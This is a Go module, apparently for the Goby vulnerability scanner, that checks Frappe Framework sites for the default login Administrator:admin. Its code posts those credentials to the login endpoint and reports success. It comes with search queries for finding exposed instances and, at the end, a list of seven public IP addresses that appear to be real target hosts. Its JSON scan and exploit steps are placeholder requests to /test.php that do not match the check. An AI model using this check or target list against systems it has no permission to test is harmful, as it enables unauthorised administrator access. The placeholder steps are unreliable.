package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Frappe-Framework default password vulnerability",
    "Description": "<p>Frappe is a low code framework. The default password Administrator: admin exists in the Frappe Framework.</p><p>An attacker can control the entire platform through the default password vulnerability, and operate the core functions with administrator privileges.</p>",
    "Product": "Frappe-Framework",
    "Homepage": "https://github.com/frappe/frappe",
    "DisclosureDate": "2023-02-22",
    "Author": "635477622@qq.com",
    "FofaQuery": "body=\"<meta name=\\\"generator\\\" content=\\\"frappe\" || body=\"frappe.ready_events.push(fn);\" || header=\"Link: </assets/frappe/js/lib/jquery/jquery.min.js\" || header=\"</assets/frappe/dist/js/frappe-web.bundle.7XJQJMPF.js\"",
    "GobyQuery": "body=\"<meta name=\\\"generator\\\" content=\\\"frappe\" || body=\"frappe.ready_events.push(fn);\" || header=\"Link: </assets/frappe/js/lib/jquery/jquery.min.js\" || header=\"</assets/frappe/dist/js/frappe-web.bundle.7XJQJMPF.js\"",
    "Level": "1",
    "Impact": "<p>An attacker can control the entire platform through the default password vulnerability, and operate the core functions with administrator privileges.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, special characters, and more than 8 digits.</p><p>2. If not necessary, the public network is prohibited from accessing the system.</p><p>3. Set access policy and whitelist access through firewall and other security devices.</p>",
    "References": [
        "https://github.com/frappe/frappe"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Frappe-Framework 框架默认口令漏洞",
            "Product": "Frappe-Framework",
            "Description": "<p>Frappe 是一个低代码框架。Frappe Framework 存在默认口令 Administrator:admin。</p><p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Frappe-Framework default password vulnerability",
            "Product": "Frappe-Framework",
            "Description": "<p>Frappe is a low code framework. The default password Administrator: admin exists in the Frappe Framework.</p><p>An attacker can control the entire platform through the default password vulnerability, and operate the core functions with administrator privileges.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, special characters, and more than 8 digits.</p><p>2. If not necessary, the public network is prohibited from accessing the system.</p><p>3. Set access policy and whitelist access through firewall and other security devices.</p>",
            "Impact": "<p>An attacker can control the entire platform through the default password vulnerability, and operate the core functions with administrator privileges.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10812"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.FollowRedirect = true
			cfg.VerifyTls = false
			cfg.Data = "cmd=login&usr=Administrator&pwd=admin&device=desktop"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return strings.Contains(resp.Utf8Html, "\"message\":\"Logged In\",")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			expResult.Output = "Username: Administrator\nPassword: admin"
			expResult.Success = true
			return expResult
		},
	))
}

//http://165.232.182.138
//http://139.180.188.37
//http://129.211.94.239
//http://143.244.149.231
//http://35.200.223.24
//http://128.199.54.110
//http://134.209.106.130
